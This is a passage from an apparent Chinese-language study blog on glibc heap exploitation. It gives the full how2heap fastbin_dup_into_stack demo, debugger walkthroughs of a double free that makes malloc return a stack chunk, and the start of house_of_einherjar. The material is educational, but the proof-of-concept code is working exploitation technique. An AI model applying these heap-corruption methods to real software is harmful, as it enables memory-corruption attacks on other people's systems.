operator\">=</span> <span class=\"token function\">chunk2mem</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>          <span class=\"token function\">alloc_perturb</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>          <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>fastbin 中检查机制比较少，而且 fastbin 作为单链表结构，同一链表中的元素由 fd 指针来进行维护。同时 fastbin 不会对 size 域的后三位进行检查</p>\n<h2 id=\"1程序源码\"><a class=\"anchor\" href=\"#1程序源码\">#</a> 1. 程序源码：</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This file extends on fastbin_dup.c by tricking malloc into\\n\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t       <span class=\"token string\">\"returning a pointer to a controlled location (in this case, the stack).\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> stack_var<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The address we want malloc() to return is %p.\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>stack_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocating 3 buffers.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>a <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>b <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>c <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1st malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2nd malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3rd malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Freeing the first one...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"If we free %p again, things will crash because %p is at the top of the free list.\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token comment\">// free(a);</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"So, instead, we'll free %p.\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now, we can free %p again, since it's not the head of the free list.\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now the free list has [ %p, %p, %p ]. \"</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t<span class=\"token string\">\"We'll now carry out our attack by modifying data at %p.\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> <span class=\"token operator\">*</span>d <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1st malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2nd malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now the free list has [ %p ].\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now, we have access to %p while it remains at the head of the free list.\\n\"</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t<span class=\"token string\">\"so now we are writing a fake free size (in this case, 0x20) to the stack,\\n\"</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t<span class=\"token string\">\"so that malloc will think there is a free chunk there and agree to\\n\"</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t<span class=\"token string\">\"return a pointer to it.\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\tstack_var <span class=\"token operator\">=</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t<span class=\"token operator\">*</span>d <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>stack_var<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3rd malloc(8): %p, putting the stack address on the free list\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"4th malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>初步看源码大概了解了程序的运行，不过对于 48 行的 sizeof (d) 存有疑问，大小是多少 (这里应该是一个指针的大小即 8 字节)，这里是将 d 的地址直接改为了 fake_chunk 的地址（也就是改了 a 的地址），但是在 fastbin 链表的 fd 指针的值也被这种方式修改了吗</p>\n<p>后面反应过来，malloc 返回的指针是数据段的位置而不是 <code>pre_size</code> ，所以直接修改 <code>*d</code>  等于修改的是对应 chunk 的 fd（修改的是 * d 指向地址内的值）</p>\n<h2 id=\"2调试程序-3\"><a class=\"anchor\" href=\"#2调试程序-3\">#</a> 2. 调试程序：</h2>\n<h3 id=\"1执行第9行unsigned-long-long-stack_var\"><a class=\"anchor\" href=\"#1执行第9行unsigned-long-long-stack_var\">#</a> 1. 执行第 9 行 <code>unsigned long long stack_var;</code></h3>\n<p>查看此处定义的栈参数的地址</p>\n<p>这个栈地址是 <code>0x7fffffffdcb0</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/TBOELRRCM4%29OHKJVBGD8IU9.png\" alt=\"\" /></p>\n<h3 id=\"2执行到第17行\"><a class=\"anchor\" href=\"#2执行到第17行\">#</a> 2. 执行到第 17 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>a <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>b <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>c <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>申请了 3 个 chunk，查看堆情况</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/%5DM2OFN3A%29%60%40%60PMHMA%40QTV_N.png\" alt=\"\" /></p>\n<h3 id=\"3执行23行freea\"><a class=\"anchor\" href=\"#3执行23行freea\">#</a> 3. 执行 23 行 <code>free(a)</code></h3>\n<p>查看堆，a 已经进入了 <code>fastbin</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/%7EDGKT%7DW%25DAJ%5D%5B%607OJ%7E5%60%7EZU.png\" alt=\"\" /></p>\n<h3 id=\"4执行29行freeb\"><a class=\"anchor\" href=\"#4执行29行freeb\">#</a> 4. 执行 29 行 <code>free(b)</code></h3>\n<p>释放 b 是为了绕过检测，使 chunk a 不是于 fastbin 直接相连的 chunk，这样第二次释放就不会被检测出来</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/YF%40%7DLVK%29C6MQKL%40V%40N%25%7DL%5D2.png\" alt=\"\" /></p>\n<h3 id=\"5执行32行freea\"><a class=\"anchor\" href=\"#5执行32行freea\">#</a> 5. 执行 32 行 <code>free(a)</code></h3>\n<p>对 a 进行再次释放（ <code>double free</code> ）</p>\n<p>在 fastbin 中已经变成了  <code>fastbin-&gt;chunk a-&gt;chunk b-&gt;chunk a</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/U0U12EX%25JZMM%5BPSBK4B_4Z6.png\" alt=\"\" /></p>\n<h3 id=\"6执行36行unsigned-long-long-d-malloc8\"><a class=\"anchor\" href=\"#6执行36行unsigned-long-long-d-malloc8\">#</a> 6. 执行 36 行 <code>unsigned long long *d = malloc(8);</code></h3>\n<p>此时 d 申请的 chunk 会是 chunk a，此时 <code>*d=*a</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/IK6Q%25I951SIM9%7E_R0X%7EG4%24N.png\" alt=\"\" /></p>\n<p>打印指针 d (发现是是 <code>chunk a</code>  的 fd 位置的地址)</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/%29Y%40H5NSC0YX%28%5B_L%29%5BAT5HB3.png\" alt=\"\" /></p>\n<h3 id=\"7执行39行malloc8\"><a class=\"anchor\" href=\"#7执行39行malloc8\">#</a> 7. 执行 39 行 <code>malloc(8)</code></h3>\n<p>此时剩下的 <code>chunk a</code>  是第一次释放的（不是第二次释放的）</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/T9JQ%25TA%402DSNPCY%28Q%7DXEQ%25W.png\" alt=\"\" /></p>\n<h3 id=\"8执行45行stack_var-0x20\"><a class=\"anchor\" href=\"#8执行45行stack_var-0x20\">#</a> 8. 执行 45 行 <code>\tstack_var = 0x20;</code></h3>\n<p>改变栈的值 = 0x20，为了构造 <code>fake_chunk</code> ，因为这里要作为 fake_chunk 的 size 位，那么我们就需要 <code>fastbin</code>  中的 <code>chunk</code>  的 fd 指向 <code>pre_size</code>  的位置，也就是 <code>&amp;stack_var-8</code></p>\n<p>查看 stack_var 的地址 <code>0x7fffffffdcb0</code>  ，所以要将其 <code>0x7fffffffdca8</code>  作为 <code>chunk a </code> 的 fd 位的值</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/9JTX0QQF9G%7E%7BP%40%5B2AN5%7EJ%29D.png\" alt=\"\" /></p>\n<h3 id=\"9执行48行d-unsigned-long-long-charstack_var-sizeofd\"><a class=\"anchor\" href=\"#9执行48行d-unsigned-long-long-charstack_var-sizeofd\">#</a> 9. 执行 48 行 <code>*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</code></h3>\n<p>这里修改了 d 指针内存放的值，改为了 <code>stack_var地址-0x8</code> ，（sizeof (d) 计算指针的大小为 8 字节）</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/%5DV00%5D5856NVLE%5B6%7D2ORVU4P.png\" alt=\"\" /></p>\n<p>此时还可以发现 fastbin 中 fake_chunk 指向了 chunk a 的 fd 处，但是这时可以通过下面发现 <code>0x555555759018</code>  的地方为 0，修改的话也可以作为一个 chunk 来使用</p>\n<h3 id=\"10执行50行malloc8\"><a class=\"anchor\" href=\"#10执行50行malloc8\">#</a> 10. 执行 50 行 <code>malloc(8)</code></h3>\n<p>这时会将 chunk a 申请出去，然后 fastbin 指向 fake_chunk</p>\n<p>可以看到 abc 三个 chunk 都已经不在 fastbin 中了，fasstbin 指向了 fake_chunk</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/LL%5DNTD%7B%5BFMGYT%5B%5B%7BB%5BQWII3.png\" alt=\"\" /></p>\n<h3 id=\"11执行51行malloc8\"><a class=\"anchor\" href=\"#11执行51行malloc8\">#</a> 11. 执行 51 行 <code>malloc(8)</code></h3>\n<p>这时就会将我们伪造出来的 fake_chunk 申请出来，可以通过程序的读写功能进行修改，这里的 fake_chunk 是在栈上，也就是说我们其实通过这种方式最终将栈空间申请了出来进行改写</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/R%7BNHL%7DIH%29I%24C6U3ZZMQ68BU.png\" alt=\"\" /></p>\n<p>此时我们就得到了一个伪造在栈空间的 <code>chunk</code></p>\n<h3 id=\"12程序运行结果\"><a class=\"anchor\" href=\"#12程序运行结果\">#</a> 12. 程序运行结果</h3>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/IJ17PBK%25%5DUN94D%29NN%25MT5FD.png\" alt=\"\" /></p>\n<p>发现了通过这种 double free 就可以申请一个栈空间来进行改写，只不过需要在栈上先伪造一个 size 位符合大小，才能用这种方式</p>\n<h1 id=\"4house_of_einherjaroff-by-one利用可进行向后合并\"><a class=\"anchor\" href=\"#4house_of_einherjaroff-by-one利用可进行向后合并\">#</a> 4. <code>house_of_einherjar</code> （off by one 利用，可进行向后合并）</h1>\n<p>利用了 <code>off by one </code> 漏洞<s>不仅可以修改下一个堆块的  <code>prev_size</code> </s>，还可以修改下一个堆块的 PREV_INUSE 比特位，通过这个方式可以进行向后合并操作（需要绕过 unlink 检测），通过这个将我们构造的任意地方的 fake_chunk 申请回来进行利用</p>\n<p>free 函数 (向后合并，4002 行)【向后合并其实是低地址的早就是空闲的 chunk 与高地址的 chunk 合并，p 指针指向低地址】：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* consolidate backward */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">prev_inuse</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 检测 p 位是否为 0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            prevsize <span class=\"token operator\">=</span> <span class=\"token function\">prev_size</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            size <span class=\"token operator\">+=</span> prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            p <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> prevsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 这里会触发 unlink</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* consolidate forward , 本例子没有用到，只是对比一下区别，这里直接吞并高地址 */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>nextinuse<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> nextchunk<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tsize <span class=\"token operator\">+=</span> nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token function\">clear_inuse_bit_at_offset</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"1程序源码-2\"><a class=\"anchor\" href=\"#1程序源码-2\">#</a> 1. 程序源码</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;malloc.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   Credit to st4g3r for publishing this technique</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome to House of Einherjar!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Tested in Ubuntu 16.04 64bit.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span> d<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nWe allocate 